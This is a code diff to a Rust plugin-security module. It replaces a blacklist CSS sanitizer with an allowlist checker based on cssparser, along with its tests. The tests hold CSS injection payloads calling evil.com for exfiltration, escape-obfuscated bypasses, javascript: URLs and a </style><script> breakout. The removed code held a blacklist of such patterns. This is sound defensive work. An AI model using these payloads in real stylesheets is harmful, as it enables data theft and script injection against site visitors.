@@ -8,8 +8,8 @@
 //!
 //! 1. [`scan_imports`] —— wasm import 白名单 = ∅。当前宿主未暴露任何 host fn，
 //!    任何 `(import ...)` 都视为不安全（防止未来误开 IO 被滥用）
-//! 2. [`sanitize_theme_css`] —— theme CSS 黑名单字符串扫描，挡常见 CSS 注入
-//!    数据外渗（`url(http://...)` / `@import` / `expression()` / `behavior:` / `javascript:`）
+//! 2. [`check_theme_css`] —— theme CSS 白名单（cssparser 分词；at-rule / 函数 /
+//!    `url()` 目标都按白名单，挡数据外渗与 `</style>` 跳出，SEC-08）
 //! 3. [`verify_manifest_consistency`] —— manifest 声明的 capability 必须对应
 //!    实际导出的 fn；缺失即拒，多余仅作 warn
 //! 4. [`verify_sha256`] —— site.json `plugins_lock` 记录预期 hash，加载前比对，
@@ -62,117 +62,190 @@ pub fn scan_imports(module: &Module) -> Result<(), String> {
   }
 }
 
-/// theme CSS **黑名单** pattern（注意：是 blacklist，不是 allowlist）。
-/// 命中任何一个 = 整段 CSS 拒绝（不进 `<style>`）。
-///
-/// S8（风险 R5）：匹配前先过 [`normalize_css_for_scan`] 规范化（解码 CSS
-/// 转义 + 去注释 + 去空白 + 小写），封堆 `\75rl(`、`url( http://`、
-/// `url(/**/http://` 等混淆绕过。仍不是完整 CSS parser，但规范化 +
-/// 整段拒绝（fail-closed）下，误拒优于漏放。彻底方案是属性/函数白名单
-/// 解析器（待 lightningcss 等依赖成本可接受时升级）。
-///
-/// 攻击场景：
-/// - `url(http://evil.com/?cookie=...)` —— CSS 注入做数据外渗（受害者浏览器
-///   主动发请求，攻击者拿到 referrer / cookie / IP）
-/// - `@import url(...)` —— 同上
-/// - `expression(...)` / `behavior:` / `-moz-binding:` —— 老引擎脚本执行向量
-/// - `javascript:` / `vbscript:` —— 在 `url()` / `content` 等场景下能执行
-///
-/// pattern 不含空白（规范化已去除全部空白）；带引号变体因此也合并进
-/// `url('http://` 等无空白形式。
-const THEME_CSS_BLACKLIST: &[&str] = &[
-  "url(http://",
-  "url(https://",
-  "url(//",
-  "url('http://",
-  "url('https://",
-  "url('//",
-  "url(\"http://",
-  "url(\"https://",
-  "url(\"//",
-  "@import",
-  "expression(",
-  "behavior:",
-  "-moz-binding:",
-  "javascript:",
-  "vbscript:",
+/// 主题 CSS 允许的 at-rule。`@import` / `@namespace` 等会加载或引用外部资源的不在内。
+const THEME_AT_RULES: &[&str] =
+  &["media", "supports", "keyframes", "font-face", "layer", "property", "container"];
+
+/// 主题 CSS 允许的函数（颜色 / 数学 / 渐变 / 变换 / 滤镜 / 网格 / 选择器 / 字体）。
+/// 能携带 URL 字符串的函数（`image-set` / `image` / `src` / `cross-fade` / `element`）
+/// 与 `attr` / `expression` 不在内；`url` 单独校验。
+const THEME_FUNCTIONS: &[&str] = &[
+  "var",
+  "calc",
+  "min",
+  "max",
+  "clamp",
+  "round",
+  "mod",
+  "rem",
+  "abs",
+  "sign",
+  "rgb",
+  "rgba",
+  "hsl",
+  "hsla",
+  "hwb",
+  "lab",
+  "lch",
+  "oklab",
+  "oklch",
+  "color",
+  "color-mix",
+  "light-dark",
+  "linear-gradient",
+  "radial-gradient",
+  "conic-gradient",
+  "repeating-linear-gradient",
+  "repeating-radial-gradient",
+  "repeating-conic-gradient",
+  "translate",
+  "translatex",
+  "translatey",
+  "translatez",
+  "translate3d",
+  "rotate",
+  "rotatex",
+  "rotatey",
+  "rotatez",
+  "rotate3d",
+  "scale",
+  "scalex",
+  "scaley",
+  "scalez",
+  "scale3d",
+  "skew",
+  "skewx",
+  "skewy",
+  "matrix",
+  "matrix3d",
+  "perspective",
+  "cubic-bezier",
+  "steps",
+  "blur",
+  "brightness",
+  "contrast",
+  "drop-shadow",
+  "grayscale",
+  "hue-rotate",
+  "invert",
+  "opacity",
+  "saturate",
+  "sepia",
+  "repeat",
+  "minmax",
+  "fit-content",
+  "not",
+  "is",
+  "where",
+  "has",
+  "nth-child",
+  "nth-last-child",
+  "nth-of-type",
+  "nth-last-of-type",
+  "lang",
+  "dir",
+  "format",
+  "local",
 ];
 
-/// S8：扫描前规范化 CSS，对抗混淆：
-/// 1. 去除 `/* ... */` 注释（防 token 分割）
-/// 2. 解码 CSS 转义 `\HH...`（1-6 位 hex + 可选空白）与 `\<char>` 字面转义
-///    （防 `\75 rl(` → `url(` 绕过）
-/// 3. 去除全部空白（防 `url( http://` 绕过；合法 CSS 语义不依赖被扫描
-///    副本的空白，原串不变）
-/// 4. 小写化
+/// 嵌套深度上限：防止 `((((…` 把递归检查压爆栈。真实主题不超过 4 层。
+const THEME_MAX_NESTING: usize = 32;
+
+/// 主题 CSS 白名单检查（SEC-08）。`Err` 带第一个被拒的构造，调用者整段丢弃该插件 CSS。
 ///
-/// 只用于安全扫描；命中与否都不修改原 CSS。
-fn normalize_css_for_scan(css: &str) -> String {
-  let mut out = String::with_capacity(css.len());
-  let mut chars = css.chars().peekable();
-  while let Some(c) = chars.next() {
-    // 注释：/* ... */ 整段丢弃
-    if c == '/' && chars.peek() == Some(&'*') {
-      chars.next(); // 吃掉 '*'
-      let mut prev = '\0';
-      for cc in chars.by_ref() {
-        if prev == '*' && cc == '/' {
-          break;
-        }
-        prev = cc;
-      }
-      continue;
-    }
-    // CSS 转义：\HH...（1-6 hex）+ 可选一个空白；或 \<char> 字面
-    if c == '\\' {
-      let mut hex = String::new();
-      while hex.len() < 6 {
-        match chars.peek() {
-          Some(h) if h.is_ascii_hexdigit() => {
-            hex.push(*h);
-            chars.next();
-          }
-          _ => break,
-        }
-      }
-      if hex.is_empty() {
-        // \<char> 字面转义：保留下一个字符本身
-        if let Some(next) = chars.next() {
-          if !next.is_whitespace() {
-            out.extend(next.to_lowercase());
-          }
-        }
-      } else {
-        // hex 转义后的一个空白属于转义序列，吃掉
-        if chars.peek().map(|w| w.is_whitespace()).unwrap_or(false) {
-          chars.next();
-        }
-        if let Some(decoded) = u32::from_str_radix(&hex, 16).ok().and_then(char::from_u32) {
-          out.extend(decoded.to_lowercase());
-        }
-      }
-      continue;
-    }
-    if c.is_whitespace() {
-      continue;
-    }
-    out.extend(c.to_lowercase());
+/// 用 cssparser（Servo / Firefox 的 CSS Syntax 3 tokenizer）分词，转义、注释、
+/// 大小写由它按浏览器的方式处理，因此 `\75 rl(` 就是 `url(`。规则：
+/// - 原文不得含 `<`：主题 CSS 进页面 `<style>`，`</style>` 永远不能出现（不变量，
+///   不依赖当前是否 SSR 输出主题样式）
+/// - at-rule 只允许 [`THEME_AT_RULES`]，函数只允许 [`THEME_FUNCTIONS`]
+/// - `url()`（含引号形式）只允许 `data:image/…` 与 `/assets/<路径>`（无 `.` / `..` 段）
+/// - bad-url / bad-string token 一律拒绝
+pub fn check_theme_css(css: &str) -> Result<(), String> {
+  if css.contains('<') {
+    return Err("`<` is not allowed".to_string());
   }
-  out
+  let mut input = cssparser::ParserInput::new(css);
+  check_css_tokens(&mut cssparser::Parser::new(&mut input), 0)
 }
 
-/// 检查 theme CSS 是否包含危险 pattern（规范化后匹配，对抗大小写 /
-/// 转义 / 空白 / 注释混淆）。
-///
-/// 返回命中的 pattern 列表；空 vec 表示通过。调用者命中时应跳过该插件 CSS
-/// 整段（不部分清洗），同时记 warn 日志。
-///
-/// 允许的合法场景：
-/// - `url(/assets/...)` —— 站内相对路径
-/// - `url(data:image/png;base64,...)` —— 内联 base64 图片（CSP 配合限制 MIME）
-pub fn sanitize_theme_css(css: &str) -> Vec<&'static str> {
-  let normalized = normalize_css_for_scan(css);
-  THEME_CSS_BLACKLIST.iter().filter(|pat| normalized.contains(*pat)).copied().collect()
+fn check_css_tokens(parser: &mut cssparser::Parser<'_, '_>, depth: usize) -> Result<(), String> {
+  use cssparser::Token;
+  if depth > THEME_MAX_NESTING {
+    return Err("nesting too deep".to_string());
+  }
+  // `next_*` 只在块 / 输入结束时返回 Err
+  while let Ok(token) = parser.next_including_whitespace_and_comments() {
+    let enters_block = match token {
+      Token::AtKeyword(name) => {
+        if !THEME_AT_RULES.contains(&name.to_ascii_lowercase().as_str()) {
+          return Err(format!("at-rule `@{name}` is not allowed"));
+        }
+        false
+      }
+      Token::Function(name) if name.eq_ignore_ascii_case("url") => {
+        nested(parser, check_quoted_url)?;
+        continue;
+      }
+      Token::Function(name) => {
+        if !THEME_FUNCTIONS.contains(&name.to_ascii_lowercase().as_str()) {
+          return Err(format!("function `{name}()` is not allowed"));
+        }
+        true
+      }
+      Token::UnquotedUrl(url) => {
+        check_css_url(url)?;
+        false
+      }
+      Token::BadUrl(_) | Token::BadString(_) => return Err("malformed url or string".to_string()),
+      Token::ParenthesisBlock | Token::SquareBracketBlock | Token::CurlyBracketBlock => true,
+      _ => false,
+    };
+    if enters_block {
+      nested(parser, |p| check_css_tokens(p, depth + 1))?;
+    }
+  }
+  Ok(())
+}
+
+/// 在刚读到的块 / 函数内部运行 `check`，把错误原因原样带出。
+fn nested(
+  parser: &mut cssparser::Parser<'_, '_>,
+  check: impl FnOnce(&mut cssparser::Parser<'_, '_>) -> Result<(), String>,
+) -> Result<(), String> {
+  parser.parse_nested_block(|p| check(p).map_err(|reason| p.new_custom_error(reason))).map_err(
+    |e| match e.kind {
+      cssparser::ParseErrorKind::Custom(reason) => reason,
+      cssparser::ParseErrorKind::Basic(_) => "malformed css".to_string(),
+    },
+  )
+}
+
+/// `url("…")`：函数体只能是一个字符串（两侧可有空白）。
+fn check_quoted_url(parser: &mut cssparser::Parser<'_, '_>) -> Result<(), String> {
+  let url = parser.expect_string().map_err(|_| "url() must hold one string".to_string())?.clone();
+  check_css_url(&url)?;
+  if parser.is_exhausted() {
+    Ok(())
+  } else {
+    Err("url() must hold one string".to_string())
+  }
+}
+
+fn check_css_url(url: &str) -> Result<(), String> {
+  let is_data_image = url.get(..11).is_some_and(|p| p.eq_ignore_ascii_case("data:image/"));
+  let is_site_asset = url.strip_prefix("/assets/").is_some_and(|rest| {
+    rest.split('/').all(|seg| {
+      !seg.is_empty()
+        && seg != "."
+        && seg != ".."
+        && seg.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.'))
+    })
+  });
+  if is_data_image || is_site_asset {
+    Ok(())
+  } else {
+    Err(format!("url `{url}` is not allowed (only data:image/ and /assets/)"))
+  }
 }
 
 /// 校验 manifest 声明的 capability 与 wasm 实际 exports 是否对齐。
@@ -305,131 +378,113 @@ mod tests {
     assert!(msg.contains("env::log"), "msg should list import: {}", msg);
   }
 
-  // ─── sanitize_theme_css ──────────────────────────────────
+  // ─── check_theme_css ──────────────────────────────────────
 
-  #[test]
-  fn css_sanitize_passes_normal_css() {
-    let css = ":root { --color-primary: #7c3aed; }\nbody { background: var(--color-bg); }";
-    assert!(sanitize_theme_css(css).is_empty());
+  fn ok(css: &str) {
+    assert_eq!(check_theme_css(css), Ok(()), "should accept: {css}");
+  }
+
+  fn rejected(css: &str) {
+    let shown: String = css.chars().take(80).collect();
+    assert!(check_theme_css(css).is_err(), "should reject: {shown}");
   }
 
   #[test]
-  fn css_sanitize_passes_data_url_image() {
-    let css = ".logo { background: url(data:image/png;base64,iVBORw0KG); }";
-    assert!(sanitize_theme_css(css).is_empty());
+  fn theme_css_accepts_tokens_colors_and_local_images() {
+    ok(
+      ":root { --primary: oklch(64.6% 0.222 41.116); --radius: 0.5rem; }\n.dark { --bg: #0c0a09; }",
+    );
+    ok("body { background: var(--background, #fff); color: rgb(0 0 0 / 50%); }");
+    ok(".x { width: calc(100% - clamp(1rem, 2vw, 3rem)); transform: translateY(-2px) rotate(3deg); }");
+    ok(".g { background: linear-gradient(to right, color-mix(in oklch, red 40%, blue), transparent); }");
+    ok("a:not(.x):is(:hover, :focus-visible) { outline: 2px solid var(--ring); }");
+    ok("@media (prefers-color-scheme: dark) { :root { --bg: black; } }");
+    ok("@supports (color: oklch(0 0 0)) { .a { color: oklch(0 0 0); } }");
+    ok("@keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }");
+    ok(".logo { background: url(data:image/png;base64,iVBORw0KG); }");
+    ok(".banner { background: url( /assets/banner.png ); }");
+    ok(".banner { background: url(\"/assets/img/banner-dxh12.webp\"); }");
+    ok("/* theme: ocean */ .q::before { content: \"»\"; font-family: \"Inter\", sans-serif; }");
+    ok("@font-face { font-family: X; src: url(/assets/x.woff2) format(\"woff2\"), local(Arial); }");
+  }
+
+  /// 审计（SEC-08）列出的绕过形式与旧黑名单已覆盖的形式。
+  #[test]
+  fn theme_css_rejects_external_and_disguised_urls() {
+    for css in [
+      "body { background: url(http://evil.com/?c=1); }",
+      "body { background: url(https://evil.com/t); }",
+      "body { background: url(//evil.com/t); }",
+      "body { background: url(http:evil.com); }",
+      "body { background: URL(HTTP://EVIL.COM/x); }",
+      "body { background: url(  http://evil.com/x ); }",
+      "body { background: url( 'http://evil.com/x' ); }",
+      "body { background: url(/* x */ http://evil.com/x); }",
+      r"body { background: \75 rl(http://evil.com/x); }",
+      r"body { background: \u\r\l(http://evil.com/x); }",
+      r"body { background: url(\/\/evil.com/x); }",
+      r"body { background: url(\68ttps://evil.com/x); }",
+      "body { background: url(evil.png); }",
+      "body { background: url(/api/auth/logout); }",
+      "body { background: url(/assets/../api/auth/logout); }",
+      "body { background: url(\"/assets/./x.png\"); }",
+      "a { content: url(javascript:alert(1)); }",
+      "body { background: url(data:text/html,x); }",
+      "input[value^=a] { background: url(https://evil.com/a); }",
+    ] {
+      rejected(css);
+    }
   }
 
   #[test]
-  fn css_sanitize_passes_relative_path() {
-    let css = ".banner { background: url(/assets/banner.png); }";
-    assert!(sanitize_theme_css(css).is_empty());
+  fn theme_css_rejects_url_carrying_functions() {
+    for css in [
+      "body { background: image-set(\"https://evil.com/x.png\" 1x); }",
+      "body { background: -webkit-image-set(\"https://evil.com/x.png\" 1x); }",
+      "body { background: image(\"https://evil.com/x.png\"); }",
+      "body { background: src(\"https://evil.com/x.png\"); }",
+      "body { background: cross-fade(url(/assets/a.png), url(/assets/b.png)); }",
+      "body { background: element(#x); }",
+      "a::after { content: attr(href); }",
+      "body { width: expression(alert('xss')); }",
+      "body { background: linear-gradient(red, image-set(\"https://evil.com/x\" 1x)); }",
+    ] {
+      rejected(css);
+    }
   }
 
   #[test]
-  fn css_sanitize_rejects_external_url() {
-    let css = "body { background: url(http://evil.com/?cookie=stolen); }";
-    let hits = sanitize_theme_css(css);
-    assert!(hits.iter().any(|p| p.contains("url(http://")));
+  fn theme_css_rejects_at_rules_outside_allowlist() {
+    for css in [
+      "@import 'https://evil.com/x.css';",
+      "@import url(/assets/x.css);",
+      r"@\69mport 'https://evil.com/x.css';",
+      "@namespace svg url(http://www.w3.org/2000/svg);",
+      "@media screen { @import 'x.css'; }",
+    ] {
+      rejected(css);
+    }
   }
 
   #[test]
-  fn css_sanitize_rejects_external_https_url() {
-    let css = "body { background: url(https://evil.com/track); }";
-    assert!(!sanitize_theme_css(css).is_empty());
+  fn theme_css_rejects_legacy_vectors_markup_and_bad_tokens() {
+    for css in [
+      ".x { behavior: url(xss.htc); }",
+      ".x { -moz-binding: url(/xbl.xml#x); }",
+      "</style><script>alert(1)</script>",
+      ".a { content: \"</style>\"; }",
+      "<!-- .a { color: red } -->",
+      "body { background: url(/assets/a b.png); }",
+      ".a { content: \"unterminated\n\"; }",
+    ] {
+      rejected(css);
+    }
   }
 
+  /// 嵌套括号不能把递归检查压爆栈。
   #[test]
-  fn css_sanitize_rejects_protocol_relative_url() {
-    let css = "body { background: url(//evil.com/track); }";
-    assert!(!sanitize_theme_css(css).is_empty());
-  }
-
-  #[test]
-  fn css_sanitize_rejects_import() {
-    let css = "@import 'https://evil.com/x.css';";
-    assert!(!sanitize_theme_css(css).is_empty());
-  }
-
-  #[test]
-  fn css_sanitize_rejects_expression() {
-    let css = "body { width: expression(alert('xss')); }";
-    assert!(!sanitize_theme_css(css).is_empty());
-  }
-
-  #[test]
-  fn css_sanitize_rejects_behavior() {
-    let css = ".x { behavior: url(xss.htc); }";
-    assert!(!sanitize_theme_css(css).is_empty());
-  }
-
-  #[test]
-  fn css_sanitize_rejects_javascript_url() {
-    let css = "a { content: url(javascript:alert(1)); }";
-    assert!(!sanitize_theme_css(css).is_empty());
-  }
-
-  #[test]
-  fn css_sanitize_case_insensitive() {
-    let css = "body { background: URL(HTTP://EVIL.COM/x); }";
-    assert!(!sanitize_theme_css(css).is_empty());
-  }
-
-  // ─── S8：混淆绕过场景 ──────────────────────────────
-
-  /// `url(` 后带空白是合法 CSS，旧实现匹配不到。
-  #[test]
-  fn css_sanitize_rejects_url_with_whitespace() {
-    let css = "body { background: url(  http://evil.com/x ); }";
-    assert!(!sanitize_theme_css(css).is_empty(), "空白混淆应被拦截");
-  }
-
-  /// CSS hex 转义：`\75 rl(` 解码后是 `url(`。
-  #[test]
-  fn css_sanitize_rejects_hex_escaped_url() {
-    let css = r"body { background: \75 rl(http://evil.com/x); }";
-    assert!(!sanitize_theme_css(css).is_empty(), "hex 转义混淆应被拦截");
-  }
-
-  /// 字面转义：`\u\r\l(` 解码后是 `url(`。
-  #[test]
-  fn css_sanitize_rejects_literal_escaped_url() {
-    let css = r"body { background: \u\r\l(http://evil.com/x); }";
-    assert!(!sanitize_theme_css(css).is_empty(), "字面转义混淆应被拦截");
-  }
-
-  /// hex 转义拼 @import：`@\69mport`。
-  #[test]
-  fn css_sanitize_rejects_escaped_import() {
-    let css = r"@\69mport 'https://evil.com/x.css';";
-    assert!(!sanitize_theme_css(css).is_empty(), "转义 @import 应被拦截");
-  }
-
-  /// 注释 + 空白分割：`url(/**/ http://`。
-  #[test]
-  fn css_sanitize_rejects_comment_split_url() {
-    let css = "body { background: url(/* x */ http://evil.com/x); }";
-    assert!(!sanitize_theme_css(css).is_empty(), "注释分割应被拦截");
-  }
-
-  /// 带引号 + 空白：`url( 'http://`。
-  #[test]
-  fn css_sanitize_rejects_quoted_url_with_whitespace() {
-    let css = "body { background: url( 'http://evil.com/x' ); }";
-    assert!(!sanitize_theme_css(css).is_empty());
-  }
-
-  /// 老 Firefox XBL 向量。
-  #[test]
-  fn css_sanitize_rejects_moz_binding() {
-    let css = ".x { -moz-binding: url(/xbl.xml#x); }";
-    assert!(!sanitize_theme_css(css).is_empty());
-  }
-
-  /// 规范化不应误伤合法 CSS（含注释 / 多空白 / data URL）。
-  #[test]
-  fn css_sanitize_normalization_keeps_legit_css_clean() {
-    let css = "/* theme: ocean */\n:root {\n  --color-primary: #0ea5e9;\n}\n.logo { background: url( data:image/png;base64,iVBORw0KG ); }\n.banner { background: url( /assets/banner.png ); }";
-    assert!(sanitize_theme_css(css).is_empty(), "合法 CSS 不应误拒");
+  fn theme_css_rejects_deep_nesting() {
+    rejected(&format!("a {{ b: {}1{} }}", "(".repeat(10_000), ")".repeat(10_000)));
   }
 
   // ─── verify_manifest_consistency ─────────────────────────
